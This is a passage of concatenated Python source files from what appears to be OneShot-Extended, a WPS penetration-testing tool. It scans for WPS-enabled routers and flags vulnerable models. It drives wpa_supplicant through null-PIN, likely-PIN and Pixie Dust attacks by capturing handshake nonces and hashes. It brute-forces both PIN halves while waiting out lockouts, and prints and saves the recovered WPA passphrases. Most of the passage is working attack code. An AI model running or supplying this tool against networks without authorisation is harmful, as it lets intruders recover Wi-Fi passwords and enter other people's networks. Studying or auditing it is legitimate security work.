        'Security type': 'Unknown',
        'WPS': False,
        'WPS version': '1.0',
        'WPS locked': False,
        'Model': '',
        'Model number': '',
        'Device name': ''
    }

    inside = False
    for raw_line in lines:
        line = raw_line.strip('\t')

        bss_match = _RE_BSS.match(line)
        if bss_match:
            inside = bss_match.group(1).upper() == target
            if inside:
                network['BSSID'] = bss_match.group(1).upper()
            continue

        if not inside:
            continue

        if _RE_WPS.match(line):
            network['WPS'] = True
        elif _RE_WPS_V2.match(line):
            if _RE_WPS_V2.match(line).group(1) == '2.0':
                network['WPS version'] = '2.0'
        elif _RE_WPS_LOCKED.match(line):
            network['WPS locked'] = bool(int(_RE_WPS_LOCKED.match(line).group(1), 16))
        elif _RE_SSID.match(line):
            try:
                d = _RE_SSID.match(line).group(1)
                essid = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
                network['ESSID'] = essid if essid.strip('\x00 ') else '<hidden>'
            except (AttributeError, IndexError):
                network['ESSID'] = '<hidden>'
        elif _RE_MODEL.match(line):
            network['Model'] = codecs.decode(_RE_MODEL.match(line).group(1), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
        elif _RE_MODEL_NUMBER.match(line):
            network['Model number'] = codecs.decode(_RE_MODEL_NUMBER.match(line).group(1), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
        elif _RE_DEVICE_NAME.match(line):
            network['Device name'] = codecs.decode(_RE_DEVICE_NAME.match(line).group(1), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

    if not network['BSSID']:
        return None
    return network


class WiFiScanner:
    """Handles parsing scan results and table."""

    def __init__(self, interface: str, vuln_list: str = None):
        self.INTERFACE = interface
        self.VULN_LIST = vuln_list

        reports_fname = REPORTS_DIR + 'stored.csv'

        try:
            # Look for already stored networks to highlight
            with open(reports_fname, 'r', newline='', encoding='utf-8') as file:
                csv_reader = csv.reader(file,
                    delimiter=';', quoting=csv.QUOTE_ALL
                )

                # Skip header
                next(csv_reader)
                self.STORED = []

                for row in csv_reader:
                    self.STORED.append(
                        (
                            row[1],   # BSSID
                            row[2]    # ESSID
                        )
                    )
        except FileNotFoundError:
            self.STORED = []

    def promptNetwork(self) -> tuple[str, dict] | None:
        """Prompts the user to select a network from the available WPS networks."""

        networks = self._iwScanner()

        if not networks:
            logger.error('No WPS networks found.')
            return

        while True:
            try:
                network_no = input('Select target (press Enter to refresh): ')

                if network_no.lower() in {'r', '0', ''}:
                    if args.clear:
                        src.utils.clearScreen()
                    result = self.promptNetwork()
                    if result is None:
                        continue
                    return result

                if int(network_no) in networks.keys():
                    selected_network = networks[int(network_no)]
                    return (selected_network['BSSID'], selected_network)

                raise IndexError
            except (IndexError, ValueError):
                logger.warning('Invalid number')

    def _iwScanner(self) -> dict[int, dict] | bool:
        """Parsing iw scan results."""

        def handleNetwork(_line, result, networks):
            networks.append(
                {
                    'ESSID': '',
                    'Security type': 'Unknown',
                    'WPS': False,
                    'WPS version': '1.0',
                    'WPS locked': False,
                    'Model': '',
                    'Model number': '',
                    'Device name': ''
                }
            )
            networks[-1]['BSSID'] = result.group(1).upper()

        def handleEssid(_line, result, networks):
            try:
                d = result.group(1)
                essid = networks[-1]['ESSID'] = codecs.decode(d,'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

                # Check if empty or only contains null/whitespace bytes
                networks[-1]['ESSID'] = essid if essid.strip('\x00 ') else '<hidden>'
            except (AttributeError, IndexError):
                networks[-1]['ESSID'] = '<hidden>'

        def handleLevel(_line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handleSecurityType(_line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                if 'Privacy' in result.group(2):
                    sec = 'WEP'
                else:
                    sec = 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN':
                    sec = 'WPA2'
                elif result.group(1) == 'WPA':
                    sec = 'WPA'
            elif sec == 'WPA':
                if result.group(1) == 'RSN':
                    sec = 'WPA/WPA2'
            elif sec == 'WPA2':
                if result.group(1) == 'PSK SAE':
                    sec = 'WPA2/WPA3'
                elif result.group(1) == 'WPA':
                    sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handleWps(_line, result, networks):
            networks[-1]['WPS'] = True

        def handleWpsVersion(_line, result, networks):
            wps_ver = networks[-1]['WPS version']

            # Only WPS 2.0 APs broadcast this, this way we can distinguish between 1.0<->2.0
            wps_ver_filtered = result.group(1).replace('* Version2:', '')

            if wps_ver_filtered == '2.0':
                wps_ver = '2.0'

            networks[-1]['WPS version'] = wps_ver

        def handleWpsLocked(_line, result, networks):
            flag = int(result.group(1), 16)
            if flag:
                networks[-1]['WPS locked'] = True

        def handleModel(_line, result, networks):
            d = result.group(1)
            networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handleModelNumber(_line: str, result: str, networks: list):
            d = result.group(1)
            networks[-1]['Model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handleDeviceName(_line, result, networks):
            d = result.group(1)
            networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        networks = []
        matchers = {
            _RE_BSS: handleNetwork,
            _RE_SSID: handleEssid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handleLevel,
            re.compile(r'(capability): (.+)'): handleSecurityType,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handleSecurityType,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handleSecurityType,
            _RE_WPS: handleWps,
            _RE_WPS_V2: handleWpsVersion,
            re.compile(r' [*] Authentication suites: (.+)'): handleSecurityType,
            _RE_WPS_LOCKED: handleWpsLocked,
            _RE_MODEL: handleModel,
            _RE_MODEL_NUMBER: handleModelNumber,
            _RE_DEVICE_NAME: handleDeviceName
        }

        command = ['iw', 'dev', f'{self.INTERFACE}', 'scan']
        try:
            iw_scan_process = subprocess.run(command,
                encoding='utf-8', stdout=subprocess.PIPE, stderr=subprocess.STDOUT
            )
        except (subprocess.CalledProcessError, FileNotFoundError) as error:
            logger.error(f'Failed to perform an iw scan: \n {error}')
            return

        lines = iw_scan_process.stdout.splitlines()

        if args.verbose:
            print('\n'.join(lines))

        for line in lines:
            if line.startswith('command failed:'):
                logger.error(f'Error: {line}')
                return False

            line = line.strip('\t')

            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)

        # By default only WPS networks are shown; with --all, WPS-disabled APs
        # are listed too (marked gray / 'OFF') so the user can spot them
        if not args.all:
            networks = list(filter(lambda x: bool(x['WPS']), networks))

            if not networks:
                return False

        # Sorting by signal level
        networks.sort(key=lambda x: x['Level'], reverse=True)

        # Putting a list of networks in a dictionary, where each key is a network number in list of networks
        network_list = {(i + 1): network for i, network in enumerate(networks)}
        network_list_items = list(network_list.items())

        def truncateStr(s: str | None, length: int, postfix='…') -> str:
            """Truncate string with the specified length."""

            if len(s) > length:
                k = length - len(postfix)
                s = s[:k] + postfix
            return s

        def colored(text: str, color: str) -> str:
            """Returns colored text"""

            if color:
                if color == 'green':
                    text = f'\033[1m\033[92m{text}\033[00m'
                if color == 'dark_green':
                    text = f'\033[32m{text}\033[00m'
                elif color == 'red':
                    text = f'\033[1m\033[91m{text}\033[00m'
                elif color == 'yellow':
                    text = f'\033[1m\033[93m{text}\033[00m'
                elif color == 'gray':
                    text = f'\033[90m{text}\033[00m'
                else:
                    return text
            else:
                return text
            return text

        print('Network marks: {1} {0} {2} {0} {3} {0} {4} {0} {5}'.format(
            '|',
            colored('Vulnerable model', color='green'),
            colored('Vulnerable WPS ver.', color='dark_green'),
            colored('WPS locked', color='red'),
            colored('Already stored', color='yellow'),
            colored('WPS disabled', color='gray')
        ))

        def entryMaxLength(item: str, max_length=27) -> int:
            """Calculates max length of network_list_items entry"""

            lengths = [len(entry[1].get(item, '')) for entry in network_list_items]
            return min(max(lengths), max_length) + 1

        # Used to calculate the max width of a collum in the network list table
        columm_lengths = {
            '#': 4,
            'sec': entryMaxLength('Security type'),
            'bssid': 18,
            'essid': entryMaxLength('ESSID'),
            'name': entryMaxLength('Device name'),
            'model': entryMaxLength('Model')
        }

        row = '{:<{#}} {:<{bssid}} {:<{essid}} {:<{sec}} {:<{#}} {:<{#}} {:<{name}} {:<{model}}'

        print(row.format(
            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'Ver.', 'WSC name', 'WSC model',
            **columm_lengths
        ))

        if args.reverse_scan:
            network_list_items = network_list_items[::-1]
        for n, network in network_list_items:
            # (FOR COMPATIBILITY) pylint: disable=inconsistent-quotes
            model = f'{network["Model"]} {network["Model number"]}'
            essid = truncateStr(network['ESSID'], 25)
            device_name = truncateStr(network['Device name'], 27)
            number = f'{n})'
            wps_ver = network['WPS version'] if network['WPS'] else 'OFF'
            line = row.format(
                number, network['BSSID'], essid,
                network['Security type'], network['Level'],
                wps_ver, device_name, model,
                **columm_lengths
            )
            if (network['BSSID'], network['ESSID']) in self.STORED:
                print(colored(line, color='yellow'))
            elif not network['WPS']:
                print(colored(line, color='gray'))
            elif network['WPS version'] == '1.0':
                print(colored(line, color='dark_green'))
            elif network['WPS locked']:
                print(colored(line, color='red'))
            elif self.VULN_LIST and (model in self.VULN_LIST) or (device_name in self.VULN_LIST):
                print(colored(line, color='green'))
            else:
                print(line)

        return network_list


# ============================================================================
# SOURCE: src/wps/connection.py
# ============================================================================
#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import socket
import tempfile
import os
import subprocess
import time
import shutil
import codecs

import src.wps.pixiewps
import src.wps.generator
import src.utils
import src.wifi.collector
import src.args

from src import logger

args = src.args.parseArgs()

class ConnectionStatus:
    """Stores WPS connection details and status."""

    def __init__(self):
        self.STATUS = '' # Must be WSC_NACK, WPS_FAIL, WPS_TIMEOUT or GOT_PSK
        self.LAST_M_MESSAGE = 0
        self.ESSID = ''
        self.BSSID = ''
        self.WPA_PSK = ''
        self.IS_LOCKED = False

    def isFirstHalfValid(self) -> bool:
        """Checks if the first half of the PIN is valid."""
        return self.LAST_M_MESSAGE > 5

    def clear(self):
        """Resets the connection status variables."""
        self.__init__()

class Initialize:
    """WPS connection"""

    def __init__(self, interface: str):
        self.INTERFACE = interface

        self.CONNECTION_STATUS = ConnectionStatus()
        self.PIXIE_CREDS  = src.wps.pixiewps.Data()

        self.TEMPDIR = tempfile.mkdtemp()

        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write(f'ctrl_interface={self.TEMPDIR}\nctrl_interface_group=root\nupdate_config=1\n')
            self.TEMPCONF = temp.name

        self.WPAS_CTRL_PATH = f'{self.TEMPDIR}/{self.INTERFACE}'
        self._initWpaSupplicant()

        self.RES_SOCKET_FILE = f'{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}'
        self.RETSOCK = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.RETSOCK.bind(self.RES_SOCKET_FILE)

        self.DISCONNECT_COUNT = 0

    @staticmethod
    def _getHex(line: str) -> str:
        """Filters WPA Supplicant output, and removes whitespaces"""

        a = line.split(':', 3)
        return a[2].replace(' ', '').upper()

    @staticmethod
    def _explainWpasNotOkStatus(command: str, respond: str):
        """Outputs details about WPA supplicant errors"""

        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return ('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
                        'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
        return '[!] Something went wrong — check out debug log'

    @staticmethod
    def _credentialPrint(wps_pin: str = None, wpa_psk: str = None, essid: str = None):
        """Prints network credentials after success"""

        logger.success(f'WPS PIN: \'{wps_pin}\'')
        logger.success(f'WPA PSK: \'{wpa_psk}\'')
        logger.success(f'AP SSID: \'{essid}\'')

    def singleConnection(self, bssid: str = None, pin: str = None, pbc_mode: bool = False, store_pin_on_fail: bool = False) -> bool:
        """        
        Establish a WPS connection, using a pin, a calculated pin (if in pixiemode), a PIN
        generated from a list of likely PINs, PBC mode, or null pin. handles pixiedust
        attacks if enabled and manages storing PINs on connection failure
        """

        pixiewps_dir = src.utils.PIXIEWPS_DIR
        generator    = src.wps.generator.WPSpin()
        collector    = src.wifi.collector.WiFiCollector()

        # Handle null pin attack
        if args.null_pin:
            pin = '00000000'
        elif pin is None:
            if args.pixie_dust:
                try:
                    filename = f'''{pixiewps_dir}{bssid.replace(':', '').upper()}.run'''

                    with open(filename, 'r', encoding='utf-8') as file:
                        t_pin = file.readline().strip()
                        if input(f'[?] Use previously calculated PIN {t_pin}? [n/Y] ').lower() != 'n':
                            pin = t_pin
                        else:
                            raise FileNotFoundError
                except FileNotFoundError:
                    pin = generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:
                # If not pixiemode, ask user to select a pin from the list
                pin = generator.promptPin(bssid) or '12345670'

        if pbc_mode:
            self._wpsConnection(bssid, pbc_mode=pbc_mode)
            bssid = self.CONNECTION_STATUS.BSSID
            pin = '<PBC mode>'
        elif store_pin_on_fail:
            try:
                self._wpsConnection(bssid, pin, retry_on_lock=True)
            except KeyboardInterrupt:
                logger.info('Aborting…')
                collector.writePin(bssid, pin)
                return False
        else:
            self._wpsConnection(bssid, pin, retry_on_lock=True)

        if self.CONNECTION_STATUS.STATUS == 'GOT_PSK':
            self._credentialPrint(pin, self.CONNECTION_STATUS.WPA_PSK, self.CONNECTION_STATUS.ESSID)
            if args.write:
                collector.writeResult(bssid, self.CONNECTION_STATUS.ESSID, pin, self.CONNECTION_STATUS.WPA_PSK)
            if not pbc_mode:
                # Try to remove temporary PIN file
                try:
                    filename = f'''{pixiewps_dir}{bssid.replace(':', '').upper()}.run'''
                    os.remove(filename)
                except FileNotFoundError:
                    pass
            return True
        if args.pixie_dust:
            if self.PIXIE_CREDS.getAll():
                pin = self.PIXIE_CREDS.runPixieWps(args.show_pixie, args.pixie_force)
                if pin:
                    return self.singleConnection(bssid, pin, store_pin_on_fail=True)
                return False

            logger.error('Not enough data to run Pixie Dust attack')
            return False

        if store_pin_on_fail:
            # Saving Pixiewps calculated PIN if can't connect
            collector.writePin(bssid, pin)
        return False

    def _initWpaSupplicant(self):
        """Initializes wpa_supplicant with the specified configuration"""

        logger.info('Running wpa_supplicant…')

        wpa_supplicant_cmd = ['wpa_supplicant']
        wpa_supplicant_cmd.extend([
            '-K', '-d',
            '-Dnl80211,wext,hostapd,wired',
            f'-i{self.INTERFACE}',
            f'-c{self.TEMPCONF}'
        ])

        try:
            self.WPAS = subprocess.Popen(wpa_supplicant_cmd,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                encoding='utf-8'
            )
        except (subprocess.CalledProcessError, FileNotFoundError) as error:
            logger.error(f'Failed to open wpa_supplicant \n {error}')
            return

        # Waiting for wpa_supplicant control interface initialization
        while True:
            ret = self.WPAS.poll()

            if ret is not None and ret != 0:
                logger.error(f'wpa_supplicant returned an error: \n {self.WPAS.communicate()[0]}')
            if os.path.exists(self.WPAS_CTRL_PATH):
                break

            time.sleep(.1)

    def _sendAndReceive(self, command: str) -> str:
        """Sends command to wpa_supplicant and returns the reply"""

        self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)

        (b, _address) = self.RETSOCK.recvfrom(4096)
        inmsg = b.decode('utf-8', errors='replace')
        return inmsg

    def _sendOnly(self, command: str):
        """Sends command to wpa_supplicant without reply"""

        self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)

    def _handleWpas(self, pbc_mode: bool = False) -> bool:
        """Handles WPA supplicant output and updates connection status"""

        line = self.WPAS.stdout.readline()

        if not line:
            self.WPAS.wait()
            return False

        line = line.rstrip('\n')

        if args.verbose:
            print(line)

        # Handle WPS protocol messages
        if line.startswith('WPS: '):
            return self._handle_wps_messages(line)

        # Handle connection state changes
        return self._handle_connection_states(line, pbc_mode)

    def _handle_wps_messages(self, line: str) -> bool:
        """Handle WPS-specific protocol messages"""

        if 'M2D' in line:
            logger.warning('Received WPS Message M2D')

            self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
            self.CONNECTION_STATUS.IS_LOCKED = True

            logger.error('This AP is not accepting PINs right now without configuration')
            return False

        if 'Building Message M' in line:
            n = int(line.split('Building Message M')[1])
            self.CONNECTION_STATUS.LAST_M_MESSAGE = n
            logger.info(f'Sending WPS Message M{n}…')

        elif 'Received M' in line:
            n = int(line.split('Received M')[1])
            self.CONNECTION_STATUS.LAST_M_MESSAGE = n
            logger.success(f'Received WPS Message M{n}')
            if n == 5:
                logger.info('The first half of the PIN is valid')

        elif 'Received WSC_NACK' in line:
            self.CONNECTION_STATUS.STATUS = 'WSC_NACK'
            logger.warning('Received WSC NACK')

            if self.CONNECTION_STATUS.LAST_M_MESSAGE < 3:
                self.CONNECTION_STATUS.IS_LOCKED = True
                return False

            logger.error('Error: wrong PIN code')

        elif 'Enrollee Nonce' in line and 'hexdump' in line:
            self._handle_pixie_data('E_NONCE', line, 16 * 2)

        elif 'Registrar Nonce' in line and 'hexdump' in line:
            self._handle_pixie_data('R_NONCE', line, 16 * 2)

        elif 'DH own Public Key' in line and 'hexdump' in line:
            self._handle_pixie_data('PKR', line, 192 * 2)

        elif 'DH peer Public Key' in line and 'hexdump' in line:
            self._handle_pixie_data('PKE', line, 192 * 2)

        elif 'AuthKey' in line and 'hexdump' in line:
            self._handle_pixie_data('AUTHKEY', line, 32 * 2)

        elif 'E-Hash1' in line and 'hexdump' in line:
            self._handle_pixie_data('E_HASH1', line, 32 * 2)

        elif 'E-Hash2' in line and 'hexdump' in line:
            self._handle_pixie_data('E_HASH2', line, 32 * 2)

        elif 'Network Key' in line and 'hexdump' in line:
            self.CONNECTION_STATUS.STATUS = 'GOT_PSK'
            self.CONNECTION_STATUS.WPA_PSK = bytes.fromhex(self._getHex(line)).decode('utf-8', errors='replace')

        return True

    def _handle_connection_states(self, line: str, pbc_mode: bool) -> bool:
        """Handle various connection state changes"""

        if ': State: ' in line and '-> SCANNING' in line:
            self.CONNECTION_STATUS.STATUS = 'scanning'
            logger.info('Scanning…')

        elif ('WPS-FAIL' in line) and (self.CONNECTION_STATUS.STATUS != ''):
            self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
            logger.warning('wpa_supplicant returned WPS-FAIL')

        elif 'Trying to authenticate with' in line:
            self.CONNECTION_STATUS.STATUS = 'authenticating'
            if 'SSID' in line:
                self.CONNECTION_STATUS.ESSID = self._decode_essid(line)
            logger.info('Authenticating…')

        elif 'Authentication response' in line:
            logger.success('Authenticated')

        elif 'Trying to associate with' in line:
            self.CONNECTION_STATUS.STATUS = 'associating'
            if 'SSID' in line:
                self.CONNECTION_STATUS.ESSID = self._decode_essid(line)
            logger.info('Associating with AP…')

        elif ('Associated with' in line) and (self.INTERFACE in line):
            bssid = line.split()[-1].upper()
            if self.CONNECTION_STATUS.ESSID:
                logger.success(f'Associated with {bssid} (ESSID: {self.CONNECTION_STATUS.ESSID})')
            else:
                logger.success(f'Associated with {bssid}')

        elif 'EAPOL: txStart' in line:
            self.CONNECTION_STATUS.STATUS = 'eapol_start'
            logger.info('Sending EAPOL Start…')

        elif 'EAP entering state IDENTITY' in line:
            logger.success('Received Identity Request')

        elif 'using real identity' in line:
            logger.info('Sending Identity Response…')

        elif 'WPS-TIMEOUT' in line:
            self.CONNECTION_STATUS.STATUS = 'WPS_TIMEOUT'

        elif 'NL80211_CMD_DEL_STATION' in line:
            self.DISCONNECT_COUNT += 1
            if self.DISCONNECT_COUNT == 5:
                logger.warning('Received NL80211 DEL_STATION too many times 🠋')
                logger.warning('This could be the result of interference, or the AP is really far')

        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.CONNECTION_STATUS.BSSID = bssid
            logger.info(f'Selected AP: {bssid}')

        return True

    def _handle_pixie_data(self, attr: str, line: str, expected_len: int):
        """Handle pixie dust attack related data"""
        hex_value = self._getHex(line)
        if len(hex_value) != expected_len:
            raise ValueError(f'Invalid {attr} length: expected {expected_len}, got {len(hex_value)}')
        setattr(self.PIXIE_CREDS, attr, hex_value)

        if args.show_pixie:
            logger.info(f'{attr}: {hex_value}')

    def _decode_essid(self, line: str) -> str:
        """Decode ESSID from wpa_supplicant output"""
        return codecs.decode(
            '\''.join(line.split('\'')[1:-1]),
            'unicode-escape'
        ).encode('latin1').decode('utf-8', errors='replace')

    def _wpsConnection(self, bssid: str = None, pin: str = None,
        pbc_mode: bool = False, retry_on_lock: bool = False) -> bool:
        """Handles WPS connection process"""

        timeout_count = 0
        ever_m = False

        while True:
            self.PIXIE_CREDS.clear()
            self.CONNECTION_STATUS.clear()
            self.WPAS.stdout.read(300) # Clean the pipe

            wps_start_time = time.time()

            if pbc_mode:
                if bssid:
                    logger.info(f'Starting WPS push button connection to {bssid}…')
                    cmd = f'WPS_PBC {bssid}'
                else:
                    logger.info('Starting WPS push button connection…')
                    cmd = 'WPS_PBC'
            else:
                logger.info(f'Trying PIN \'{pin}\'…')
                cmd = f'WPS_REG {bssid} {pin}'

            if bssid:
                self.PIXIE_CREDS.BSSID = bssid.upper()

            r = self._sendAndReceive(cmd)

            if 'OK' not in r:
                self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
                logger.error(self._explainWpasNotOkStatus(cmd, r))
                return False

            while True:
                if not src.utils.isInterfaceUp(self.INTERFACE):
                    logger.error(f'Interface {self.INTERFACE} is no longer UP. Aborting connection attempt.')
                    self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
                    break

                res = self._handleWpas(pbc_mode=pbc_mode)

                if self.CONNECTION_STATUS.LAST_M_MESSAGE > 0:
                    ever_m = True

                if not res or self.CONNECTION_STATUS.STATUS in {'WSC_NACK', 'GOT_PSK', 'WPS_FAIL'}:
                    break

                if self.CONNECTION_STATUS.STATUS == 'WPS_TIMEOUT':
                    elapsed = int(time.time() - wps_start_time)
                    timeout_count += 1

                    if timeout_count >= 3 and not ever_m:
                        logger.error('AP never responded to WPS after multiple attempts. '
                                     'WPS is likely disabled in its firmware (or the AP is out of range)')
                        self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
                        break

                    logger.warning(f'Received WPS-timeout after {elapsed} seconds')

                    try:
                        self.WPAS.terminate()
                        self.WPAS.wait(timeout=2)
                    except subprocess.TimeoutExpired:
                        self.WPAS.kill()

                    self._initWpaSupplicant()
                    time.sleep(1) # Brief delay before retry

                    # Resend the WPS command
                    r = self._sendAndReceive(cmd)
                    if 'OK' not in r:
                        self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
                        logger.error(self._explainWpasNotOkStatus(cmd, r))
                        return False

                    self.CONNECTION_STATUS.clear()
                    continue

            self._sendOnly('WPS_CANCEL')

            if retry_on_lock and self.CONNECTION_STATUS.IS_LOCKED:
                logger.warning(f'{bssid} is WPS LOCKED. Retrying in {args.timeout}s…')
                time.sleep(args.timeout)
                continue

            return self.CONNECTION_STATUS.STATUS == 'GOT_PSK'

    def _cleanup(self):
        """Terminates connections and removes temporary files"""

        try:
            self.RETSOCK.close()
            if hasattr(self, 'WPAS'):
                self.WPAS.terminate()
                if self.WPAS.stdout:
                    self.WPAS.stdout.close()
                self.WPAS.wait()
        except OSError:
            pass

        if os.path.exists(self.RES_SOCKET_FILE):
            os.remove(self.RES_SOCKET_FILE)

        shutil.rmtree(self.TEMPDIR, ignore_errors=True)

        if os.path.exists(self.TEMPCONF):
            os.remove(self.TEMPCONF)

    def __del__(self):
        self._cleanup()


# ============================================================================
# SOURCE: src/wps/bruteforce.py
# ============================================================================
#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import collections
import statistics
import time

from datetime import datetime
from src import logger

import src.wps.generator
import src.wps.connection
import src.utils
import src.args

args = src.args.parseArgs()

class BruteforceStatus:
    """Stores bruteforce details and status."""

    def __init__(self):
        self.START_TIME = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.MASK = ''
        self.LAST_ATTEMPT_TIME = time.time() # Last PIN attempt start time
        self.ATTEMPTS_TIMES = collections.deque(maxlen=15)

        self.COUNTER = 0
        self.STATISTICS_PERIOD = 5

    def displayStatus(self):
        """
        Displays the current status of the brute force process, including the 
        percentage of completion, start time, and average time per PIN attempt.
        """
        average_pin_time = statistics.mean(self.ATTEMPTS_TIMES)

        if len(self.MASK) == 4:
            percentage = int(self.MASK) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.MASK[4:]) / 11000)) * 100

        logger.info('{:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
            percentage, self.START_TIME, average_pin_time
        ))

    def registerAttempt(self, mask: str):
        """
        Registers an attempt with the given mask, updates the attempt counter,
        records the time taken since the last attempt, and displays status if
        the counter reaches the statistics period.
        """
        current_time = time.time()

        self.MASK = mask
        self.COUNTER += 1
        self.ATTEMPTS_TIMES.append(current_time - self.LAST_ATTEMPT_TIME)
        self.LAST_ATTEMPT_TIME = current_time

        if self.COUNTER == self.STATISTICS_PERIOD:
            self.COUNTER = 0
            self.displayStatus()

class Initialize:
    """Handles bruteforce"""

    def __init__(self, interface: str):
        self.BRUTEFORCE_STATUS = BruteforceStatus()
        self.CONNECTION_STATUS = src.wps.connection.ConnectionStatus()
        self.GENERATOR  = src.wps.generator.WPSpin()
        self.CONNECTION = src.wps.connection.Initialize(
            interface
        )

    def _firstHalfBruteforce(self, bssid: str, first_half: str) -> str | bool:
        """Attempts to bruteforce the first half of a WPS PIN"""

        checksum = self.GENERATOR.checksum

        while int(first_half) < 10000:
            if not src.utils.isInterfaceUp(self.CONNECTION.INTERFACE):
                logger.error(f'Interface {self.CONNECTION.INTERFACE} is no longer UP. Aborting bruteforce.')
                return False

            t = int(first_half + '000')
            pin = f'{first_half}000{checksum(t)}'

            self.CONNECTION.singleConnection(bssid, pin)

            if self.CONNECTION.CONNECTION_STATUS.IS_LOCKED:
                logger.warning(f'{bssid} is WPS LOCKED. Retrying PIN {pin} in {args.timeout}s…')
                time.sleep(args.timeout)
                continue

            if self.CONNECTION.CONNECTION_STATUS.isFirstHalfValid():
                logger.info('First half found')
                return first_half

            if self.CONNECTION.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
                logger.warning('WPS transaction failed, re-trying last pin')
                return self._firstHalfBruteforce(bssid, first_half)

            first_half = str(int(first_half) + 1).zfill(4)
            self.BRUTEFORCE_STATUS.registerAttempt(first_half)

            if args.delay:
                time.sleep(args.delay)

        logger.warning('First half not found')
        return False

    def _secondHalfBruteforce(self, bssid: str, first_half: str, second_half: str) -> str | bool:
        """Attempts to bruteforce the second half of a WPS PIN"""

        checksum = self.GENERATOR.checksum

        while int(second_half) < 1000:
            if not src.utils.isInterfaceUp(self.CONNECTION.INTERFACE):
                logger.error(f'Interface {self.CONNECTION.INTERFACE} is no longer UP. Aborting bruteforce.')
                return False

            t = int(first_half + second_half)
            pin = f'{first_half}{second_half}{checksum(t)}'

            self.CONNECTION.singleConnection(bssid, pin)

            if self.CONNECTION.CONNECTION_STATUS.IS_LOCKED:
                logger.warning(f'{bssid} is WPS LOCKED. Retrying PIN {pin} in {args.timeout}s…')
                time.sleep(args.timeout)
                continue

            if self.CONNECTION.CONNECTION_STATUS.LAST_M_MESSAGE > 6:
                return pin

            if self.CONNECTION.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
                logger.warning('WPS transaction failed, re-trying last pin')
                return self._secondHalfBruteforce(bssid, first_half, second_half)

            second_half = str(int(second_half) + 1).zfill(3)
            self.BRUTEFORCE_STATUS.registerAttempt(first_half + second_half)

            if args.delay:
                time.sleep(args.delay)

        return False

    def smartBruteforce(self, bssid: str, start_pin: str = None):
        """Attempts to bruteforce a WPS PIN."""

        sessions_dir = src.utils.SESSIONS_DIR
        filename = f'''{sessions_dir}{bssid.replace(':', '').upper()}.run'''

        if (not start_pin) or (len(start_pin) < 4):
            try:
                # Trying to restore previous session
                with open(filename, 'r', encoding='utf-8') as file:
                    if input(f'[?] Restore previous session for {bssid}? [n/Y]').lower() != 'n':
                        mask = file.readline().strip()
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]

        self.BRUTEFORCE_STATUS.MASK = mask

        try:
            if len(mask) == 4:
                first_half = self._firstHalfBruteforce(bssid, mask)
                if first_half and (self.CONNECTION_STATUS.STATUS != 'GOT_PSK'):
                    self._secondHalfBruteforce(bssid, first_half, '001')
            elif len(mask) == 7:
                first_half = mask[:4]
                second_half = mask[4:]
                self._secondHalfBruteforce(bssid, first_half, second_half)
            raise KeyboardInterrupt
        except KeyboardInterrupt as e:
            logger.info('Aborting…')

            with open(filename, 'w', encoding='utf-8') as file:
                file.write(self.BRUTEFORCE_STATUS.MASK)
            logger.info(f'Session saved in {filename}')

            if args.loop:
                raise KeyboardInterrupt from e


# ============================================================================
